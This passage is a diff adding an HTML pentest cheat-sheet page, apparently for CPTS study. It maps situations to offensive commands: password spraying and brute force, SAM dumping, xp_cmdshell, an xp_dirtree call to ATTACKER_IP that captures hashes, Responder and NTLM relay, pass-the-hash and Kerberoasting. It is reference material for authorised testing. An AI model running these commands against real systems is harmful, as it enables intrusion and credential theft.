@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Start here | Paracausal Telemetry</title>
+    <meta name="description" content="A scenario router for a live pentest: pick your situation (an open port, a shell, credentials, attacking AD) and jump straight to the next commands and the tool that does the work." />
+    <meta name="robots" content="index,follow" />
+    <meta name="theme-color" content="#0a0b0c" />
+    <meta name="referrer" content="strict-origin-when-cross-origin" />
+    <link rel="canonical" href="https://paracausaltelemetry.com/cpts/start/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="Paracausal Telemetry" />
+    <meta property="og:title" content="Start here" />
+    <meta property="og:description" content="A scenario router for a live pentest: pick your situation (an open port, a shell, credentials, attacking AD) and jump straight to the next commands and the tool that does the work." />
+    <meta property="og:url" content="https://paracausaltelemetry.com/cpts/start/" />
+    <meta property="og:image" content="https://paracausaltelemetry.com/src/social-preview.png?v=558cbf06" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:image" content="https://paracausaltelemetry.com/src/social-preview.png?v=558cbf06" />
+    <link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" />
+    <link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin />
+    <link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin />
+    <link rel="stylesheet" href="/styles.css?v=276fa973-site9" />
+    <link rel="stylesheet" href="/cpts/start/start.css?v=sc1" />
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"HowTo","name":"Start here","description":"A scenario router for a live pentest: pick your situation (an open port, a shell, credentials, attacking AD) and jump straight to the next commands and the tool that does the work.","url":"https://paracausaltelemetry.com/cpts/start/","isPartOf":{"@type":"CollectionPage","name":"CPTS","url":"https://paracausaltelemetry.com/cpts/"}}</script>
+  </head>
+  <body>
+    <script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script>
+    <a class="skip-to-content" href="#sc-main">Skip to the content</a>
+    <div class="page-shell">
+      <header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">CPTS</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/">Writeups</a><a href="/cpts/" aria-current="page">CPTS</a><a href="/links/">Links</a><a href="/talks/">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header>
+      <main id="sc-main" class="sc-main">
+        <nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/cpts/">CPTS</a><span>/</span><span aria-current="page">Start here</span></nav>
+        <section class="page-hero">
+          <div class="page-hero-card">
+            <canvas class="hero-dither" aria-hidden="true"></canvas>
+            <div class="page-hero-copy">
+              <p class="eyebrow">CPTS &middot; Scenario router</p>
+              <h1>Where do I start?<span class="signal-stop">.</span></h1>
+              <p>Where to start when you are in front of a target and need the next command, not a tutorial. Pick your situation, open it, and jump straight to the moves and the tool that does the work. Search filters every play. This is a working reference for authorised testing only.</p>
+            </div>
+          </div>
+        </section>
+        <div class="sc-search" role="search">
+          <label class="sc-search-label" for="sc-q">Search the plays</label>
+          <div class="sc-search-row">
+            <input class="tool-input sc-search-input" id="sc-q" type="search" autocomplete="off" placeholder="smb, got a shell, ntlm hash, kerberoast&hellip;" />
+            <span class="sc-search-count" id="sc-count" aria-live="polite">20 situations</span>
+          </div>
+        </div>
+        <div class="sc-groups" id="sc-groups">
+          <section class="sc-group" id="scgroup-open-service" aria-labelledby="scgroup-open-service-title">
+        <header class="sc-group-head">
+          <h2 id="scgroup-open-service-title">A port is open</h2>
+          <p class="sc-group-blurb">Straight off the scan: the first move on each service, then the route to access.</p>
+        </header>
+        <ul class="sc-list">
+          <li class="sc-item" data-search="smb (445 / 139) the richest target on a windows network. enumerate anonymously, then with a credential. null / guest session: shares, users, groups and the password policy in one pass. enum4linux-ng -a target netexec smb target -u &#39;&#39; -p &#39;&#39; --shares smb enumeration with a credential: spray, list shares, look for (pwn3d!) and dump. netexec smb target -u users.txt -p &#39;welcome1&#39; --continue-on-success netexec smb target -u user -p pass --shares --sam attacking services local admin? execute, or relay unsigned smb. impacket-psexec &#39;domain/user:pass@target&#39; credential access map">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">SMB (445 / 139)</span>
+              <span class="sc-detail">The richest target on a Windows network. Enumerate anonymously, then with a credential.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Null / guest session: shares, users, groups and the password policy in one pass.</p>
+              <pre class="sc-cmd"><code>enum4linux-ng -A TARGET
+netexec smb TARGET -u &#39;&#39; -p &#39;&#39; --shares</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-smb-enum">SMB enumeration &rarr;</a>
+            </li>
+            <li class="sc-step">
+              <p class="sc-step-text">With a credential: spray, list shares, look for (Pwn3d!) and dump.</p>
+              <pre class="sc-cmd"><code>netexec smb TARGET -u users.txt -p &#39;Welcome1&#39; --continue-on-success
+netexec smb TARGET -u user -p pass --shares --sam</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-attacking-services">Attacking services &rarr;</a>
+            </li>
+            <li class="sc-step">
+              <p class="sc-step-text">Local admin? Execute, or relay unsigned SMB.</p>
+              <pre class="sc-cmd"><code>impacket-psexec &#39;DOMAIN/user:pass@TARGET&#39;</code></pre>
+              <a class="sc-step-link" href="/cpts/credential-access/">Credential access map &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+          <li class="sc-item" data-search="http / https (80 / 443 / 8080) fingerprint the stack, discover content, then attack the app. identify the stack and find hidden content and vhosts. whatweb http://target ffuf -u http://target/fuzz -w /usr/share/seclists/discovery/web-content/common.txt web recon put a proxy in front so you can read and replay every request. # browser / tools -&gt; 127.0.0.1:8080 (burp) web proxies test the inputs: sqli, lfi, upload, command injection, ssti. &#39; or 1=1-- - sqlmap -u &#39;http://target/?id=1&#39; --batch --dump sql injection known off-the-shelf app (wordpress, tomcat, jenkins, gitlab)? searchsploit &lt;app&gt; &lt;version&gt; attacking common applications">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">HTTP / HTTPS (80 / 443 / 8080)</span>
+              <span class="sc-detail">Fingerprint the stack, discover content, then attack the app.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Identify the stack and find hidden content and vhosts.</p>
+              <pre class="sc-cmd"><code>whatweb http://TARGET
+ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-web-recon">Web recon &rarr;</a>
+            </li>
+            <li class="sc-step">
+              <p class="sc-step-text">Put a proxy in front so you can read and replay every request.</p>
+              <pre class="sc-cmd"><code># browser / tools -&gt; 127.0.0.1:8080 (Burp)</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-web-proxies">Web proxies &rarr;</a>
+            </li>
+            <li class="sc-step">
+              <p class="sc-step-text">Test the inputs: SQLi, LFI, upload, command injection, SSTI.</p>
+              <pre class="sc-cmd"><code>&#39; OR 1=1-- -
+sqlmap -u &#39;http://TARGET/?id=1&#39; --batch --dump</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-sql-injection">SQL injection &rarr;</a>
+            </li>
+            <li class="sc-step">
+              <p class="sc-step-text">Known off-the-shelf app (WordPress, Tomcat, Jenkins, GitLab)?</p>
+              <pre class="sc-cmd"><code>searchsploit &lt;app&gt; &lt;version&gt;</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-common-apps">Attacking common applications &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+          <li class="sc-item" data-search="ftp (21) anonymous first, then a login, then what the login lets you do. try anonymous, list and pull files. ftp target nmap -p21 --script ftp-anon target attacking services brute a real login with a short list; writable root under a web dir = webshell upload. hydra -l users.txt -p pass.txt ftp://target hydra">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">FTP (21)</span>
+              <span class="sc-detail">Anonymous first, then a login, then what the login lets you do.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Try anonymous, list and pull files.</p>
+              <pre class="sc-cmd"><code>ftp TARGET
+nmap -p21 --script ftp-anon TARGET</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-attacking-services">Attacking services &rarr;</a>
+            </li>
+            <li class="sc-step">
+              <p class="sc-step-text">Brute a real login with a short list; writable root under a web dir = webshell upload.</p>
+              <pre class="sc-cmd"><code>hydra -L users.txt -P pass.txt ftp://TARGET</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-hydra">Hydra &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+          <li class="sc-item" data-search="ssh (22) keys and weak passwords are the way in. throttle to ~4 tasks and brute a known or likely user. hydra -l users.txt -p pass.txt -t 4 ssh://target hydra found an id_rsa? crack it if encrypted, then log in. ssh2john id_rsa &gt; ssh.hash john --wordlist=rockyou.txt ssh.hash password attacks map">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">SSH (22)</span>
+              <span class="sc-detail">Keys and weak passwords are the way in.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Throttle to ~4 tasks and brute a known or likely user.</p>
+              <pre class="sc-cmd"><code>hydra -L users.txt -P pass.txt -t 4 ssh://TARGET</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-hydra">Hydra &rarr;</a>
+            </li>
+            <li class="sc-step">
+              <p class="sc-step-text">Found an id_rsa? Crack it if encrypted, then log in.</p>
+              <pre class="sc-cmd"><code>ssh2john id_rsa &gt; ssh.hash
+john --wordlist=rockyou.txt ssh.hash</code></pre>
+              <a class="sc-step-link" href="/cpts/password-cracking/">Password attacks map &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+          <li class="sc-item" data-search="rdp (3389) a full desktop with a credential or a hash. brute (keep -t low), or connect with a credential. hydra -l users.txt -p &#39;welcome1&#39; -t 4 rdp://target xfreerdp /v:target /u:user /p:pass rdp access only have the hash? pass it (needs restricted admin). xfreerdp /v:target /u:user /pth:nthash pass-the-hash">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">RDP (3389)</span>
+              <span class="sc-detail">A full desktop with a credential or a hash.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Brute (keep -t low), or connect with a credential.</p>
+              <pre class="sc-cmd"><code>hydra -L users.txt -p &#39;Welcome1&#39; -t 4 rdp://TARGET
+xfreerdp /v:TARGET /u:user /p:pass</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-rdp-access">RDP access &rarr;</a>
+            </li>
+            <li class="sc-step">
+              <p class="sc-step-text">Only have the hash? Pass it (needs Restricted Admin).</p>
+              <pre class="sc-cmd"><code>xfreerdp /v:TARGET /u:user /pth:NTHASH</code></pre>
+              <a class="sc-step-link" href="/cpts/credential-access/">Pass-the-Hash &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+          <li class="sc-item" data-search="mssql (1433) / mysql (3306) a database login is often command execution. log in, enable and run xp_cmdshell on mssql. impacket-mssqlclient &#39;domain/user:pass@target&#39; -windows-auth enable_xp_cmdshell; xp_cmdshell &#39;whoami&#39; database attacks capture the service&#39;s netntlm hash with a unc path, then crack/relay. exec xp_dirtree &#39;\\attacker_ip\share&#39;; attacking services">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">MSSQL (1433) / MySQL (3306)</span>
+              <span class="sc-detail">A database login is often command execution.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Log in, enable and run xp_cmdshell on MSSQL.</p>
+              <pre class="sc-cmd"><code>impacket-mssqlclient &#39;DOMAIN/user:pass@TARGET&#39; -windows-auth
+enable_xp_cmdshell; xp_cmdshell &#39;whoami&#39;</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-database-attacks">Database attacks &rarr;</a>
+            </li>
+            <li class="sc-step">
+              <p class="sc-step-text">Capture the service&#39;s NetNTLM hash with a UNC path, then crack/relay.</p>
+              <pre class="sc-cmd"><code>EXEC xp_dirtree &#39;\\ATTACKER_IP\share&#39;;</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-attacking-services">Attacking services &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+          <li class="sc-item" data-search="snmp (161/udp) community strings leak the whole config. guess the community string, then walk it for users, processes and secrets. onesixtyone -c community.txt target snmpwalk -v2c -c public target snmp enumeration">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">SNMP (161/udp)</span>
+              <span class="sc-detail">Community strings leak the whole config.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Guess the community string, then walk it for users, processes and secrets.</p>
+              <pre class="sc-cmd"><code>onesixtyone -c community.txt TARGET
+snmpwalk -v2c -c public TARGET</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-snmp-enum">SNMP enumeration &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+          <li class="sc-item" data-search="dns (53) a zone transfer hands you the namespace. try a zone transfer, then brute subdomains. dig axfr @target domain dnsenum --dnsserver target domain service enumeration">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">DNS (53)</span>
+              <span class="sc-detail">A zone transfer hands you the namespace.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Try a zone transfer, then brute subdomains.</p>
+              <pre class="sc-cmd"><code>dig axfr @TARGET DOMAIN
+dnsenum --dnsserver TARGET DOMAIN</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-service-enum">Service enumeration &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+        </ul>
+      </section>
+        <section class="sc-group" id="scgroup-foothold" aria-labelledby="scgroup-foothold-title">
+        <header class="sc-group-head">
+          <h2 id="scgroup-foothold-title">I have a shell</h2>
+          <p class="sc-group-blurb">First execution on a host. Stabilise, enumerate, escalate.</p>
+        </header>
+        <ul class="sc-list">
+          <li class="sc-item" data-search="the shell is unstable no job control, dies on ctrl-c. upgrade to a full pty. python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; # ctrl-z; stty raw -echo; fg; export term=xterm shell upgrade">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">The shell is unstable</span>
+              <span class="sc-detail">No job control, dies on Ctrl-C.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Upgrade to a full PTY.</p>
+              <pre class="sc-cmd"><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+# Ctrl-Z; stty raw -echo; fg; export TERM=xterm</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-shell-upgrade">Shell upgrade &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+          <li class="sc-item" data-search="a windows shell enumerate the host and your token, then escalate to system. who am i, what privileges, what is running. whoami /all systeminfo tasklist /svc windows quick ops map run a scanner, then exploit the one finding (services, tokens, alwaysinstallelevated). winpeasany.exe whoami /priv windows privilege escalation dump the local credential stores. reg save hklm\sam sam.save &amp; reg save hklm\system system.save dump &amp; crack">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">A Windows shell</span>
+              <span class="sc-detail">Enumerate the host and your token, then escalate to SYSTEM.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Who am I, what privileges, what is running.</p>
+              <pre class="sc-cmd"><code>whoami /all
+systeminfo
+tasklist /svc</code></pre>
+              <a class="sc-step-link" href="/cpts/windows/">Windows quick ops map &rarr;</a>
+            </li>
+            <li class="sc-step">
+              <p class="sc-step-text">Run a scanner, then exploit the one finding (services, tokens, AlwaysInstallElevated).</p>
+              <pre class="sc-cmd"><code>winPEASany.exe
+whoami /priv</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-windows-privesc">Windows privilege escalation &rarr;</a>
+            </li>
+            <li class="sc-step">
+              <p class="sc-step-text">Dump the local credential stores.</p>
+              <pre class="sc-cmd"><code>reg save hklm\sam sam.save &amp; reg save hklm\system system.save</code></pre>
+              <a class="sc-step-link" href="/cpts/password-cracking/">Dump &amp; crack &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+          <li class="sc-item" data-search="a linux shell enumerate, walk the privesc primitives, get to root. context and the quick wins. id; sudo -l find / -perm -4000 -type f 2&gt;/dev/null getcap -r / 2&gt;/dev/null linux quick ops map run linpeas, cross-check suid/sudo on gtfobins. ./linpeas.sh linux privilege escalation hunt for credentials in configs, history and keys. grep -rnie &#39;password|secret&#39; /var/www /etc /home 2&gt;/dev/null credential hunting">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">A Linux shell</span>
+              <span class="sc-detail">Enumerate, walk the privesc primitives, get to root.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Context and the quick wins.</p>
+              <pre class="sc-cmd"><code>id; sudo -l
+find / -perm -4000 -type f 2&gt;/dev/null
+getcap -r / 2&gt;/dev/null</code></pre>
+              <a class="sc-step-link" href="/cpts/linux/">Linux quick ops map &rarr;</a>
+            </li>
+            <li class="sc-step">
+              <p class="sc-step-text">Run linPEAS, cross-check SUID/sudo on GTFOBins.</p>
+              <pre class="sc-cmd"><code>./linpeas.sh</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-linux-privesc">Linux privilege escalation &rarr;</a>
+            </li>
+            <li class="sc-step">
+              <p class="sc-step-text">Hunt for credentials in configs, history and keys.</p>
+              <pre class="sc-cmd"><code>grep -rniE &#39;password|secret&#39; /var/www /etc /home 2&gt;/dev/null</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-credential-hunting">Credential hunting &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+        </ul>
+      </section>
+        <section class="sc-group" id="scgroup-creds" aria-labelledby="scgroup-creds-title">
+        <header class="sc-group-head">
+          <h2 id="scgroup-creds-title">I have credentials or a hash</h2>
+          <p class="sc-group-blurb">Turn a secret into access, or into a password.</p>
+        </header>
+        <ul class="sc-list">
+          <li class="sc-item" data-search="a plaintext password spray it, reuse it, log in with it. spray across the subnet for reuse, then get a shell. netexec smb 10.10.10.0/24 -u user -p &#39;password1&#39; --continue-on-success evil-winrm -i target -u user -p &#39;password1&#39; netexec">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">A plaintext password</span>
+              <span class="sc-detail">Spray it, reuse it, log in with it.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Spray across the subnet for reuse, then get a shell.</p>
+              <pre class="sc-cmd"><code>netexec smb 10.10.10.0/24 -u user -p &#39;Password1&#39; --continue-on-success
+evil-winrm -i TARGET -u user -p &#39;Password1&#39;</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-netexec">NetExec &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+          <li class="sc-item" data-search="an ntlm hash authenticate with the hash, no cracking needed. pass the hash over smb / winrm, or spray it. netexec smb target -u user -h nthash --local-auth evil-winrm -i target -u user -h nthash impacket-psexec user@target -hashes :nthash pass-the-hash">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">An NTLM hash</span>
+              <span class="sc-detail">Authenticate with the hash, no cracking needed.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Pass the hash over SMB / WinRM, or spray it.</p>
+              <pre class="sc-cmd"><code>netexec smb TARGET -u user -H NTHASH --local-auth
+evil-winrm -i TARGET -u user -H NTHASH
+impacket-psexec user@TARGET -hashes :NTHASH</code></pre>
+              <a class="sc-step-link" href="/cpts/credential-access/">Pass-the-Hash &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+          <li class="sc-item" data-search="a kerberos ticket or keytab reuse a ccache/keytab, or extract the hash from it. point tools at the ccache, or import a keytab. export krb5ccname=/tmp/krb5cc_... kinit user@realm -k -t user.keytab klist pass-the-ticket">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">A Kerberos ticket or keytab</span>
+              <span class="sc-detail">Reuse a ccache/keytab, or extract the hash from it.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Point tools at the ccache, or import a keytab.</p>
+              <pre class="sc-cmd"><code>export KRB5CCNAME=/tmp/krb5cc_...
+kinit user@REALM -k -t user.keytab
+klist</code></pre>
+              <a class="sc-step-link" href="/cpts/credential-access/">Pass-the-Ticket &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+          <li class="sc-item" data-search="a captured hash identify the type, then crack it. name the format, then wordlist + rules. hashid &#39;hash&#39; hashcat -m &lt;mode&gt; hashes.txt rockyou.txt -r best64.rule password attacks map">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">A captured hash</span>
+              <span class="sc-detail">Identify the type, then crack it.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Name the format, then wordlist + rules.</p>
+              <pre class="sc-cmd"><code>hashid &#39;HASH&#39;
+hashcat -m &lt;mode&gt; hashes.txt rockyou.txt -r best64.rule</code></pre>
+              <a class="sc-step-link" href="/cpts/password-cracking/">Password attacks map &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+          <li class="sc-item" data-search="a protected file (zip / kdbx / office) extract a crackable hash with a *2john tool. convert, then crack. keepass2john database.kdbx &gt; kp.hash john --wordlist=rockyou.txt kp.hash hashcat / john">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">A protected file (zip / kdbx / office)</span>
+              <span class="sc-detail">Extract a crackable hash with a *2john tool.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Convert, then crack.</p>
+              <pre class="sc-cmd"><code>keepass2john Database.kdbx &gt; kp.hash
+john --wordlist=rockyou.txt kp.hash</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-hashcat">Hashcat / John &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+        </ul>
+      </section>
+        <section class="sc-group" id="scgroup-ad" aria-labelledby="scgroup-ad-title">
+        <header class="sc-group-head">
+          <h2 id="scgroup-ad-title">I&#39;m attacking Active Directory</h2>
+          <p class="sc-group-blurb">The domain: from no creds to Domain Admin.</p>
+        </header>
+        <ul class="sc-list">
+          <li class="sc-item" data-search="on the internal network, no credentials poison, relay and name the domain. poison llmnr/nbt-ns to capture netntlmv2 hashes. sudo responder -i eth0 responder relay that auth to an unsigned host instead of cracking. impacket-ntlmrelayx -tf targets.txt -smb2support ntlm relay find the domain and enumerate users for a spray. nmap -p88,389 --script krb5-enum-users,ldap-rootdse target kerbrute userenum --dc target -d domain.local users.txt kerbrute">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">On the internal network, no credentials</span>
+              <span class="sc-detail">Poison, relay and name the domain.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Poison LLMNR/NBT-NS to capture NetNTLMv2 hashes.</p>
+              <pre class="sc-cmd"><code>sudo responder -I eth0</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-responder">Responder &rarr;</a>
+            </li>
+            <li class="sc-step">
+              <p class="sc-step-text">Relay that auth to an unsigned host instead of cracking.</p>
+              <pre class="sc-cmd"><code>impacket-ntlmrelayx -tf targets.txt -smb2support</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-ntlm-relay">NTLM relay &rarr;</a>
+            </li>
+            <li class="sc-step">
+              <p class="sc-step-text">Find the domain and enumerate users for a spray.</p>
+              <pre class="sc-cmd"><code>nmap -p88,389 --script krb5-enum-users,ldap-rootdse TARGET
+kerbrute userenum --dc TARGET -d domain.local users.txt</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-kerbrute">Kerbrute &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+          <li class="sc-item" data-search="i have a domain credential map the domain and find the path. collect bloodhound data and read the shortest path to da. bloodhound-python -u user -p pass -d domain.local -c all -ns target bloodhound roast: kerberoast service accounts and as-rep roast pre-auth-less users. impacket-getuserspns -request &#39;domain.local/user:pass&#39; impacket-getnpusers domain.local/ -usersfile users.txt kerberos attacks">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">I have a domain credential</span>
+              <span class="sc-detail">Map the domain and find the path.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Collect BloodHound data and read the shortest path to DA.</p>
+              <pre class="sc-cmd"><code>bloodhound-python -u user -p pass -d domain.local -c all -ns TARGET</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-bloodhound">BloodHound &rarr;</a>
+            </li>
+            <li class="sc-step">
+              <p class="sc-step-text">Roast: Kerberoast service accounts and AS-REP roast pre-auth-less users.</p>
+              <pre class="sc-cmd"><code>impacket-GetUserSPNs -request &#39;domain.local/user:pass&#39;
+impacket-GetNPUsers domain.local/ -usersfile users.txt</code></pre>
+              <a class="sc-step-link" href="/cpts/#tool-kerberos-attacks">Kerberos attacks &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+          <li class="sc-item" data-search="i need to move to another host pass what you have: hash, key, ticket or certificate. pick the technique for what you hold. # hash -&gt; pass-the-hash; key -&gt; overpass-the-hash; cert -&gt; pkinit; ticket -&gt; pass-the-ticket credential access &amp; lateral movement">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">I need to move to another host</span>
+              <span class="sc-detail">Pass what you have: hash, key, ticket or certificate.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">Pick the technique for what you hold.</p>
